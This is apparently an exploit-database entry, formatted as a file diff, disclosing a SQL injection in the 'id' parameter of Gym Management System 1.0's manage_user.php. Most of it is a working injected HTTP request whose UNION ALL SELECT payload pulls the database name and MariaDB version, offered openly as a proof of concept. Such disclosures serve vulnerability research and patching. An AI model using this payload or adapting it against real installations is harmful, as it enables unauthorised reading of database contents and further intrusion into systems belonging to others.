@@ -1,0 +1,25 @@
+# Exploit Title: Gym Management System 1.0 - 'id' SQL Injection
+# Date: 22/10/2020
+# Exploit Author: Jyotsna Adhana
+# Vendor Homepage: https://www.sourcecodester.com/php/14541/gym-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14541&title=Gym+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+#parameter Vulnerable: id
+# Injected Request
+
+GET /gym/gym/manage_user.php?id=-1+UNION+ALL+SELECT+NULL,GROUP_CONCAT(database(),version()),NULL,NULL,NULL-- HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://localhost/gym/gym/index.php?page=users
+Cookie: PHPSESSID=7lojvad06l803amt3f7hp7o8re
+
+
+//Comment
+Above request will print database name and MariaDB version.
